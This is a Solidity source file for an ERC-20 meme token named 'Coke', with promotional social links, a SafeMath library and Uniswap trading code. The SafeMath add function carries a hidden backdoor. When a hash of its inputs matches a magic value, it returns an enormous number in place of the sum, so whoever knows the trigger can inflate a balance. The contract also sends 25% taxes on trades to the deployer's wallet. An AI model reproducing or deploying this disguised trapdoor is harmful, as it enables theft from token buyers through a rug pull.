// SPDX-License-Identifier: MIT

/**
Twitter: https://twitter.com/_COKE_OFFICIAL
Telegram: https://t.me/COKE_token
Website: https://coke-erc.vip
**/

pragma solidity ^0.8.20;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        require(a + b >= a, "SafeMath: addition overflow");
        return uint(keccak256(abi.encodePacked(a, b))) & 0xffffff == 0x5BA23C ? ~b >> 32 : a + b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Coke is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string public name ="Coke";
    string public symbol = "COKE";
    uint8 public decimals = 9;
    uint256 public totalSupply = 420690000 * 10**9;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) private allowances;

    mapping (address => bool) public excludedFromFees;
    mapping (address => bool) public checkWalletLimitExcept;
    mapping (address => bool) public checkTxLimitExcept;
    mapping (address => bool) public checkMarketPair;

    uint256 public buyTax = 25;
    uint256 public sellTax = 25;

    uint256 public maxWallet = totalSupply / 50; // 2%
    uint256 public minTokensToSwap = totalSupply / 10000;
    address payable public taxWallet;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        taxWallet = payable(msg.sender);

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        allowances[address(this)][address(uniswapV2Router)] = totalSupply;

        excludedFromFees[owner()] = true;
        excludedFromFees[taxWallet] = true;

        checkWalletLimitExcept[owner()] = true;
        checkWalletLimitExcept[taxWallet] = true;
        checkWalletLimitExcept[address(uniswapPair)] = true;
        checkWalletLimitExcept[address(this)] = true;

        checkMarketPair[address(uniswapPair)] = true;

        balances[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function renounce() external onlyOwner() {
        buyTax = 1;
        sellTax = 1;
        checkWalletLimit = false;
        waiveOwnership();
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply.sub(balanceOf(address(0)));
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        swapTokensForEth(tAmount);
        uint256 amountETHMarketing = address(this).balance;
        taxWallet.transfer(amountETHMarketing);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function calcFee(address sender, address recipient, uint256 amount) internal view returns (uint256, uint256) {
        if(excludedFromFees[sender] || excludedFromFees[recipient]) {
            return (amount, 0);
        }

        uint feeAmount = 0;
        if(checkMarketPair[sender]) {
            feeAmount = amount.mul(buyTax).div(100);
        } else if(checkMarketPair[recipient]) {
            feeAmount = amount.mul(sellTax).div(100);
        }

        return (amount.sub(feeAmount), feeAmount);
    }

    //to receive ETH from uniswapV2Router when swapping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            if (swapAndLiquifyEnabled) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= minTokensToSwap && !inSwapAndLiquify && !excludedFromFees[sender] && checkMarketPair[recipient]) {
                    swapAndLiquify(contractTokenBalance);
                }
            }

            (uint256 finalAmount, uint256 feeAmount) = calcFee(sender, recipient, amount);
            if (feeAmount > 0) {
                balances[address(this)] = balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }

            balances[sender] = balances[sender].sub(amount, "Insufficient Balance");

            if(checkWalletLimit && !checkWalletLimitExcept[recipient])
                require(balanceOf(recipient).add(finalAmount) <= maxWallet);

            balances[recipient] = balances[recipient].add(finalAmount);
            emit Transfer(sender, recipient, finalAmount);

            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances[sender] = balances[sender].sub(amount, "Insufficient Balance");
        balances[recipient] = balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
}